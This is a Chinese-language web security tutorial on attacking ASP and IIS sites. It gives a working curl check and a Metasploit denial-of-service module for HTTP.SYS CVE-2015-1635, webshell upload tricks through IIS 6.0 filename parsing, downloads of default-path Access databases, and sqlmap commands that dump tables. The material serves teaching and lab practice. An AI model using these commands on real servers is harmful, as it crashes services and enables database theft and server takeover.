

# WEB攻防-ASP应用&HTTP.SYS&短文件&文件解析&Access注入&数据库泄漏

![image-20250929221235933](https://img.yatjay.top/md/20250929221235991.png)

## 知识点
1、ASP-SQL注入-Access数据库

2、ASP-默认安装-数据库泄漏下载

3、ASP-IIS-CVE&短文件&解析&写入

## 章节点

Web层面：Web2.0 & Web3.0

语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）

OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等

业务逻辑：水平垂直越权，支付签约&购买充值，找回机制，数据并发，验证码&弱口令等

特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等

关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等

Web3.0：未待完续筹备中....







## 演示案例

### ASP-默认安装-MDB数据库泄漏下载

由于大部分ASP程序与ACCESS数据库搭建，但**ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用**，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击。

`.mdb`文件就是Access数据库的文件，本质上是表格，可以用office中的Access软件打开

一个ASP+Access数据库程序的，数据库配置语句示例如下：

```asp
<%
Set conn=server.Createobject("adodb.connection")
connstr="provider=microsoft.jet.oledb.4.0;data source="&server.mappath("./database/#data.mdb")  //配置Access数据库路径
conn.open connstr
%>
```

通过互联网找到搭建平台源码，从源码中可以看到上述数据库配置路径

如果平台以默认配置进行搭建，那么访问者可以构造URL即可下载该`.mdb`文件如

`192.168.126.131:81/database/%23data.mdb`

该文件中就有敏感文件如账号密码，这是由ASP+Access这种语言架构的特性决定的

### ASP-中间件-CVE&短文件&解析&写权限

#### HTTP.SYS（CVE-2015-1635）

该漏洞无法拿到权限，但能够使得目标主机蓝屏，达到破坏效果，影响业务

##### 漏洞描述

漏洞描述：远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。

##### 影响版本

影响版本：Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2

##### 漏洞利用条件

漏洞利用条件：安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本

##### 漏洞复现

验证漏洞是否存在

执行`curl -v http://192.168.20.130 -H "Host: irrelevant" -H "Range: bytes=0-18446744073709551615"`

返回状态码为416且出现The requested range is not satisfiable.则表示该漏洞存在。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.20.130 -H "Host: 192.168.20.130" -H "Range: bytes=0-18446744073709551615"
*   Trying 192.168.20.130:80...
* Connected to 192.168.20.130 (192.168.20.130) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.20.130
> User-Agent: curl/7.88.1
> Accept: */*
> Range: bytes=0-18446744073709551615
> 
< HTTP/1.1 416 Requested Range Not Satisfiable
< Content-Type: text/html
< Last-Modified: Thu, 18 May 2023 14:48:28 GMT
< Accept-Ranges: bytes
< ETag: "7049b7ce9789d91:0"
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Mon, 29 Sep 2025 14:58:53 GMT
< Content-Length: 362
< Content-Range: bytes */689
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Requested Range Not Satisfiable</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Requested Range Not Satisfiable</h2>
<hr><p>HTTP Error 416. The requested range is not satisfiable.</p>  //出现此句说明漏洞存在
</BODY></HTML>
* Connection #0 to host 192.168.20.130 left intact

```

进入msfconsole，使用`auxiliary/dos/http/ms15_034_ulonglongadd`，按如下配置目标主机IP地址和端口之后run即可复现

```bash
msfconsole
use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts xx.xx.xx.xx
set rport xx
run
```

执行结果如下图所示

![image-20250929230533544](https://img.yatjay.top/md/20250929230533583.png)

#### IIS短文件名猜解漏洞

1、此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。

2、漏洞成因：为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir /x

3、应用场景：后台路径获取，数据库文件获取，其他敏感文件获取等

4、利用工具：

- https://github.com/irsdl/IIS-ShortName-Scanner
- https://github.com/lijiejie/IIS_shortname_Scanner

#### IIS文件解析-IIS 6.0文件解析漏洞

好的，我们来详细介绍一下经典的 **IIS 6.0 文件解析漏洞**。

这是一个非常著名且具有代表性的Web服务器漏洞，在当年影响深远，即使现在，一些遗留的老系统中仍可能遇到。

##### 漏洞概述

**IIS 6.0** 是微软随 Windows Server 2003 推出的互联网信息服务组件。其文件解析机制中存在一个严重的安全缺陷，攻击者可以利用该漏洞，将原本应该是静态文件的请求（如图片、文本）交给动态脚本处理程序（如ASP）来执行，从而绕过文件上传限制，获取Webshell，最终控制服务器。

这个漏洞的核心在于 **IIS 6.0 对文件名解析的异常处理**。

##### 漏洞原理与细节

IIS 6.0 主要存在两种利用方式的解析漏洞：

###### 1. 分号截断解析漏洞 (`;`)

该版本默认会将`*.asp;.jpg `此种格式的文件名，当成Asp解析，如`logo.asp;.jpg `

这是最著名的利用方式。

- **原理**：IIS 6.0 在解析文件名时，会将分号 `;`后面的内容截断，忽略不计。它会认为分号前的部分才是文件的真实扩展名。
- **利用方式**：假设网站有一个文件上传功能，只允许上传 `.jpg`格式的图片。攻击者可以上传一个包含ASP恶意代码的文件，并将其命名为 `shell.asp;.jpg`。
- **解析过程**：上传后，文件在服务器上的完整名称是 `shell.asp;.jpg`。当攻击者通过浏览器访问这个文件时，URL 为 `http://www.example.com/upload/shell.asp;.jpg`。IIS 6.0 接收到请求后，看到路径中有 `.asp`，于是将其交给 `asp.dll`这个处理程序来解析执行。在交给 `asp.dll`之前，IIS 6.0 会进行“截断”操作，它认为 `;`之后的内容是无效的，所以实际处理的文件名被识别为 `shell.asp`。`asp.dll`成功地执行了 `shell.asp;.jpg`文件中的ASP代码，尽管它的后缀是 `.jpg`。

**简单来说，IIS 6.0 错误地将 `shell.asp;.jpg`识别并解析为了一个ASP脚本文件。**

###### 2. 目录路径解析漏洞

该版本默认会将`*.asp/`目录下的所有文件当成Asp解析，如：`xx.asp/logo.jpg`

- **原理**：IIS 6.0 会将任何以特定目录名结尾的文件夹下的**所有文件**，都视为该目录对应的脚本文件来处理。
- **利用方式**：常见的目录名包括 `*.asp`、`*.asa`、`*.cer`、`*.cdx`。攻击者可以上传一个名为 `shell.jpg`的恶意脚本文件到名为 `upload.asp`的目录中。
- **解析过程**：文件路径为 `/upload.asp/shell.jpg`。当攻击者访问 `http://www.example.com/upload.asp/shell.jpg`。IIS 6.0 看到路径中包含 `.asp`目录，它会认为 `shell.jpg`这个文件应该被当作ASP脚本来处理。于是，IIS 将 `shell.jpg`交给 `asp.dll`执行，其中的恶意代码被运行。

**简单来说，IIS 6.0 错误地将 某个asp目录下的所有文件都识别为ASP脚本。**

**为什么会有 `.cer`和 `.cdx`？**

这是因为在IIS的应用程序映射中，不仅 `.asp`扩展名映射给了 `asp.dll`，`.asa`、`.cer`、`.cdx`也默认被映射了。因此，`/upload.cer/shell.jpg`同样会被解析执行。

#### IIS 7.x 文件解析漏洞

在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为php文件，但IIS 7.x有补丁，一般很难碰到

应用场景：配合文件上传获取Webshell，



#### IIS写权限漏洞

IIS<=6.0 目录权限开启写入，开启WebDAV，设置为允许

参考利用：https://cloud.tencent.com/developer/article/2050105



### ASP-SQL注入-SQLMAP使用&ACCESS注入

ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。

python sqlmap.py -u "" --tables //获取表名

python sqlmap.py -u "" --cloumns -T admin //获取admin表名下的列名

python sqlmap.py -u "" --dump -C "" -T admin  //获取表名下的列名数据